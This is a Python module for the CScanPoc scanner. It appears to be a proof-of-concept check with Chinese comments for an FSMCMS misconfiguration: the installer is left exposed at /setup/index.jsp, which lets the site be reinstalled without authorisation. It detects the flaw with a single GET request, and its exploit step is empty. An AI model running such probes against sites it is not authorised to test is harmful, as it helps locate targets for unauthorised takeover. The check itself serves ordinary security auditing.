# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = 'e160af21-6982-45a1-9356-a8076e67534d'
    name = 'FSMCMS 未授权网站重装'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.MISCONFIGURATION # 漏洞类型
    disclosure_date = '2013-11-19'  # 漏洞公布时间
    desc = '''
        网站安装程序在安装之后默认没有删除，也没有限制，可以很容易地恶意把网站重装了。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'FSMCMS'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '36dc6b5a-bd86-46c3-b8eb-f12eed83cad0'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/setup/index.jsp'
            r = requests.get(self.target + payload)
            if r.status_code == 200 and '</font><input type="text" name="SetUpPath"' in r.content :
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
